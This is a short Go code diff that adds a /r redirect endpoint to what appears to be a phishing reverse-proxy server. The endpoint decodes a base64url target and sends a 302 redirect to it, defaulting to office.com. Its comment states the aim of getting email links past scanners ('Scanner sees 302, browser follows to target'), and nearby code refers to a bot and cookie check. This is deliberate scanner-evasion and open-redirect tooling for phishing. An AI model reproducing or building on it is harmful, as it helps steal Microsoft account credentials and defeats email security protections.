@@ -8,6 +8,7 @@ import (
 	"bytes"
 	"crypto/tls"
 	"embed"
+	"encoding/base64"
 	"encoding/json"
 	"fmt"
 	"io"
@@ -66,6 +67,22 @@ func main() {
 	mux.HandleFunc("GET /healthz", func(w http.ResponseWriter, r *http.Request) {
 		w.WriteHeader(http.StatusOK)
 		w.Write([]byte("ok"))
+	})
+
+	// Redirect hop — for email links. Scanner sees 302, browser follows to target.
+	// Usage: /r?t=<base64url-encoded-https-url>
+	mux.HandleFunc("GET /r", func(w http.ResponseWriter, r *http.Request) {
+		target := r.URL.Query().Get("t")
+		if target == "" {
+			http.Redirect(w, r, "https://office.com", http.StatusFound)
+			return
+		}
+		decoded, err := base64.RawURLEncoding.DecodeString(target)
+		if err != nil || !strings.HasPrefix(string(decoded), "http") {
+			http.Redirect(w, r, "https://office.com", http.StatusFound)
+			return
+		}
+		http.Redirect(w, r, string(decoded), http.StatusFound)
 	})
 
 	// All paths go through proxy handler — bot/cookie check at top
